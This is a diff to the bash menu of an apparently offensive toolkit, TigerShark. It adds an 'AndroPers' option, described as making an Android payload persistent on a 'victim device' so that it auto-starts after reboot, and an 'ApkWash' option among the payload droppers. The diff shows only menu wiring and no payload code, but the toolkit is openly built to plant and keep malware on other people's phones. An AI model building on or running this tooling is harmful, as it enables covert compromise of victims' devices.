@@ -69,7 +69,7 @@ postopt(){
 persist(){
     echo -e "${W}"
     PS3='What would you like to do?'
-        options=("EvilReg" "Back")
+        options=("EvilReg" "AndroPers" "Back")
         select opt in "${options[@]}"
         do
             case $opt in
@@ -84,6 +84,11 @@ persist(){
                     fi
                     ;;
 
+                "AndroPers")
+                    echo -e "${W}This script can be use in order to make your android payload persistent\nJust copt it to victim device and payload will auto-start upon restart${NC}"
+                    kdialog --geometry 600x800 --textbox /opt/TigerShark/.vs/androp.txt
+                    ;;
+                
                 "Back")
                     postopt
                     ;;
@@ -206,7 +211,7 @@ dropper_mods(){
 droid(){
     echo -e "${RED}"
         PS3='How would you like to compile your android payload?'
-            options=("GetDroid" "apkinfector" "Back")
+            options=("GetDroid" "apkinfector" "ApkWash" "Back")
             select opt in "${options[@]}"
             do
                 case $opt in
@@ -218,6 +223,10 @@ droid(){
                         ./Modules/Droppers/droid/apkinf.sh
                         ;;
 
+                    "ApkWash")
+                        ./Modules/Droppers/droid/apkwash.sh
+                        ;;
+                        
                     "Back")
                         ./tigershark
                         ;;
